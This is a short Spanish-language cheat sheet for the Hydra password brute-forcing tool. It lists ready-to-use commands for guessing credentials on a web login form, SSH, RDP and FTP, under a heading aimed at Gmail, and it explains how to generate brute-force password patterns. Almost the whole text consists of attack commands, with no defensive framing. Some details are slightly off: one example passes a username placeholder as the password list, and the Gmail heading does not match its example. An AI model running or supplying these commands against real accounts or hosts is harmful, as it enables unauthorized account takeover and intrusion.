es una herramienta de fuerza bruta 

##Panel de login

```bash
	hydra -L <USERNAME> -P <USERNAME> localhost -s 8080 http-post-form "/:username=^USER^&password=^PASS^:Invalid username or password" -o ~/project/hydra_results.txt
```

##SSH 

```bash
hydra -L <USERNAME> -P <PASSWORD> ssh://<IP>
```

##RDP 

```bash
hydra -L <USERNAME> -P <PASSWORD> rdp://<IP>
```

##GMAIL

```bash
sudo hydra -l <usuario> -x <min>:<max>:<patrón> <protocolo>://<objetivo>
```

.`<usuario>`: Especifica el nombre de usuario objetivo.
`<min>` y `<max>`: Representan la longitud mínima y máxima de la contraseña a generar.
    
`<patrón>`: Define el patrón de generación de contraseñas. Puedes utilizar caracteres como "?" para representar espacios donde se generarán las combinaciones.
    
 `<protocolo>`: Especifica el protocolo a atacar, como `ftp`, `http`, `pop3`, etc.
    
 `<objetivo>`: La dirección del objetivo.

```bash
sudo hydra -l admin -x 6:8:aA1 ftp://ejemplo.com
```

